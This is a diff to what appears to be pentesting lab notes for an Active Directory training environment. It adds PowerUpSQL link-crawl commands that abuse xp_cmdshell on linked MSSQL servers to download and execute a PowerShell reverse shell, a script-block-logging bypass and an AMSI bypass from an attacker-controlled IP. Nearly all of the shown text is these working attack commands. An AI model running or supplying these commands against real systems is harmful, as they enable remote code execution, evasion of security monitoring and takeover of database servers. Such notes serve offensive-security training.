@@ -67,7 +67,10 @@ select * from openquery(""nextHost",'select * from openquery("nexNextHost","sele
 </strong><strong>
 </strong>Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'powershell download cradle"
 <strong>
-</strong><strong>
+</strong>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http:// 172.16.100.X/Invoke-PowerShellTcp.ps1'')"' –QueryTarget eu-sql
+<strong>
+</strong>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(http:// 172.16.100.X/sbloggingbypass.ps1);iex (New-Object Net.WebClient).DownloadString(http:// 172.16.100.X/amsibypass.txt);iex (New-Object Net.WebClient).DownloadString(http:// 172.16.100.X/Invoke-powershelltcpex.ps1)"' –QueryTarget eu-sql
+<strong>
 </strong>//this runs accross all links
 => only for eu-sql we get an output
 </code></pre>
